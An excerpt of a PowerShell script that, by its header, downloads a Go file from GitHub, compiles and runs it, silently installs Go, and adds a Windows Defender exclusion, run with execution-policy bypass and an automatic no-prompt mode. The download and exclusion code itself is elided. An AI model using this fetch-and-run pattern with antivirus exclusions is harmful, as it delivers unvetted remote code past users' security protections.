<#
privatefile.ps1
- Downloads a Go source file (privatefile.go) from a GitHub URL
- Optionally installs Go silently to a system-wide location and adds to PATH (requires admin)
- Compiles and runs the Go program
- Adds a Defender exclusion for the file/folder optionally (requires admin)
- Logs actions to %TEMP%\download_runner.log

USAGE (interactive):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\privatefile.ps1

USAGE (auto, no prompts):
    powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\privatefile.ps1 -Auto
...
if (-not $Url -or $Url.Trim() -eq "") {
    ...
    $Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile.go"
    if ($env:GITHUB_PAT) {
...
# Begin main
# -------------------------
Log "privatefile.ps1 started. DestFolder: $DestFolder  Url: $Url"
...
if ($ext -eq ".go") {
    ...
    Log "Unexpected extension ($ext). Expected .go file. Please check the downloaded file."
    Write-Host "Error: Downloaded file ($destPath) is not a .go file. Please check the GitHub URL."
    exit 1
}

Log "privatefile.ps1 finished."
